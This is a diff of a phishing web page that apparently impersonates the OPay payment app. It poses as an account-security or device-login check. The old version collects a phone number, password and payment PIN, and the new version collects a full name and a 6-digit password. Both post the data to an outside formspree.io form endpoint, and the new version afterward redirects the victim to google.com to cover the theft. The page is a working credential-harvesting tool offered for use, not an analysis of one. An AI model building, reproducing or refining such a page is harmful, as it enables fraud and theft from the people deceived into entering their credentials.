@@ -1,142 +1,143 @@
 <!DOCTYPE>
 <html>
 <head>
-<title>opay</title>
-<style>
- body {
-       background-color: #FFF;
-       font-size: 20px;
-        width: 1010px;
-        hight: 100%;
-        text-align: center;
-      }
-   .pageTitle{
-        border: none;
-        wight: 1009px;
-        hight: 600px;
-        font-size: 50px;
-       text-align: center;
-        color: #000;
-        padding-top: 20px;
-    }
-  .nice svg {margin-right: 10px; vertical-align: top;}
-.nice {
-height: 100px; 
-width: 800px; 
-color: #fff; 
-background: #9DACB6; 
-outline: none; 
-border: none; 
-border-radius: 50px; 
-font-size: 50px; 
-font-weight: 400; 
-margin: 8px 0; 
-transition: all 0.4s ease;}
-.nice:hover {
-background: #26C28A;
-color: #FFF;
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>start</title>
+    <style>
+        *{
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+   font-family: 'Poppins', sans-serif;
 }
- .numbers{
-         height: 100px; 
-         width: 600px;
-         border: 2px solid #9DACB6;
-         border-radius: 20px 50px 50px 20px;
-         background-color: #F8F8FB;
-         color: #000;
-         font-size: 40px;
-         padding: 0 0 0 20px;
-     }
-  .inputss {
-        width: 1006px;
-        hight: 109px;
-        border: none;
-        font-weight: bold;
-        display: flex;
-        flex-direction: row;
-        color: #000;
-        margin: 0 0 40px 0;
-         }
- .place {
-      height: 100px; 
-      width: 500px;
-      margin: auto;
-      border: none;
-      border-radius: 20px;
-      background-color: #F8F8FB;
-      color: #000;
-      font-size: 40px;
-      padding: 0 0 0 30px;
-   }
- .label {
-         font-size: 49px;
-         color: #26C28A;
-         font-weight: bold;
-         font-family: Courier New;
-     }
-   .number{
-         height: 100px; 
-         width: 400px;
-         border: 2px solid #9DACB6;
-         border-radius: 20px;
-         background-color: #F8F8FB;
-         margin: 10px;
-         color: #000;
-         font-size: 45px;
-         padding: 0 148px 0 148px;
-     }
-  .inputs {
-        width: 1006px;
-        hight: 109px;
-        border: none;
-        font-weight: bold;
-        display: flex;
-        flex-direction: row;
-        color: #000;
-        margin: 0 0 40px 0;
-        justify-content: center;
-         }
-  span {
-         background-color: #26C28A;
-         color: FFFFFF;
-         font-size: 40px;
-        }
- .pin { border: none;
-        font-size: 30px;
-       text-align: center;
-        color: #000;
+.container{
+    width: 100%;
+    height: 100vh;
+    background: #fff;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+}
+
+.container form{
+    width: 100%;
+    max-width: 500px;
+    padding: 50px 30px 20px;
+    background: whitesmoke;
+    border-radius: 4px;
+    position: relative;
+}
+    h1 {
+    font-size: 20px;
+    color: #0f2027;
+    text-align: center;
+}
+.input-group{
+    flex-direction: column;
+    width: 100%;
+    display: flex;
+    margin: 10px 0;
+    position: relative;
+}
+.input-group label{
+    flex-basis: 28%;
+    margin-right: 10px;
+}
+.input-group input, .input-group textarea{
+    border: 2px solid #f0f0f0;
+	border-radius: 4px;
+	display: block;
+	padding: 10px;
+	width: 100%;
+}
+.input-group input:focus {
+    outline: 0;
     }
+::placeholder{
+    font-size: 14px;
+}
+
+form button{
+  width: 100%;
+    background: #26C28A;
+    color: #fff;
+    border-radius: 5px;
+    border: 1px solid rgba(255, 255, 255, 0.7);
+    padding: 10px 40px;
+    outline: 0;
+    cursor: pointer;
+    display: block;
+    margin: 30px auto 10px;
+}
+.input-group span {
+    position: absolute;
+    bottom: 12px;
+    right: 17px;
+    font-size: 12px;
+    color: red;
+}
+.input-group span i{
+    color: #26C28A;
+    margin-bottom: 2px;
+}
+.ib{
+    color: red;
+}
 </style>
+    <script src="https://kit.fontawesome.com/c4254e24a8.js" crossorigin="anonymous"></script>
 </head>
 <body>
-    <div class="pageTitle">
-     <h3>secure your account</h3>
-    </div>
- <div class="form">
-           <form id="my-form" action="https://formspree.io/f/xgebwded" method="POST">
-            <div class="inputss">
-             <label class="label" for="mobile">account phone number</label>
-              <input type="tel" class="numbers" id="mobile" placeholder="phone number" name="mobile" value="" required>
-            </div>
-            <div class="inputss">
-             <label class="label" for="password">enter Password</label>
-              <input type="password" class="place" id="password" autocomplete="off" value="" required name="password" placeholder="password">
-            </div>
-    <hr>
-            <div class="pin">
-            <h4>Verify payment PIN to continue</h4>
-            <h3> Please enter <span>4-degits payment PIN</span></h3>
-    <div class="inputs">
-      <input type="tel" class="number" placeholder="PIN" id="mobile" name="password" value="" required>
-    </div>
-    </div>
-    <div class="but">
-      <button type="submit" id="regButton" class="nice"">verify</button>
-        <p id="my-form-status"></p>
-    </div>
- </form>
- </div>
- <script>
-    var form = document.getElementById("my-form");
+  <div class="container">
+     <form id="my-form" action="https://formspree.io/f/mrgvzvbq" method="POST">
+         <h1>verify device login</h1>
+      <div class="input-group">
+        <label>Full name</label>
+        <input type="text" placeholder="enter full name" name="full name" required>
+        <span id="name-error"></span>
+      </div>
+
+      <div class="input-group">
+        <label>6-digits old Password</label>
+        <input type="number" placeholder="  * * * * * *" id="contact-phone" onkeyup="validatePhone()" name="old password">
+                <span id="phone-error"></span>
+      </div>
+
+    <button onclick="validateForm()">verify</button>
+    <span id="my-form-status"></span>
+  </form>
+  
+  </div>
+  <script>
+      var phoneError = document.getElementById('phone-error');
+      var submitError = document.getElementById('submit-error');
+      
+ function validatePhone(){
+     var phone = document.getElementById('contact-phone').value;
+     if (phone === '')    {
+            phoneError.innerHTML = 'enter old Password ';
+        return false;
+     } 
+    if (phone.length < 6)      {
+       phoneError.innerHTML = 'enter 6-digits password';
+        return false;
+    }
+    if (phone.length > 6)      {
+     phoneError.innerHTML = 'incorrect<br>(6-digits)';
+        return false;
+      }
+     phoneError.innerHTML = '<i class="fas fa-check-circle"></i>';
+        return true;
+ }
+function validateForm(){
+   if (!validatePhone()){
+   event.preventDefault();
+        return false;
+    }
+    else if(validatePhone()){
+        return true;
+        }
+}
+var form = document.getElementById("my-form");
     
     async function handleSubmit(event) {
       event.preventDefault();
@@ -150,6 +151,7 @@ color: #FFF;
         }
       }).then(response => {
         if (response.ok) {
+    window.location.assign("https://www.google.com");
           status.innerHTML = "successful";
           form.reset()
         } else {
@@ -157,15 +159,15 @@ color: #FFF;
             if (Object.hasOwn(data, 'errors')) {
               status.innerHTML = data["errors"].map(error => error["message"]).join(", ")
             } else {
-              status.innerHTML = "Oops! there was a problem securing your account "
+              status.innerHTML = "check network connection"
             }
           })
         }
       }).catch(error => {
-        status.innerHTML = "Oops! There was a problem securing your account"
+        status.innerHTML = "check network connection"
       });
     }
     form.addEventListener("submit", handleSubmit)
-</script>
+  </script>
 </body>
 </html>
